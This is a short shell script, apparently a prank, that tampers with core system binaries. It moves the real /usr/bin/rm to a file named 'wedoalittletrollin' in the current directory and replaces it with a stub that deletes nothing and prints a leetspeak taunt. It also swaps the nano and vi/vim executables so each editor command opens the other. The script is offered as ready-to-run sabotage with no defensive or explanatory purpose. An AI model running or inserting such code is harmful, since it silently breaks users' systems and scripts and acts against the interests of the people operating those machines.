#!/bin/sh

# modifying rm
mv /usr/bin/rm wedoalittletrollin
echo "#!/bin/sh" > /usr/bin/rm
echo "echo '1 533 y0u d3l371n6 my f1l35'" >> /usr/bin/rm
chmod +x /usr/bin/rm

# the ol' switcharoos
mv /usr/bin/nano /usr/bin/nano.bak
mv /usr/bin/vi /usr/bin/vi.bak
mv /usr/bin/vim /usr/bin/vim.bak
cp /usr/bin/nano.bak /usr/bin/vi
cp /usr/bin/nano.bak /usr/bin/vim
cp /usr/bin/vi.bak /usr/bin/nano
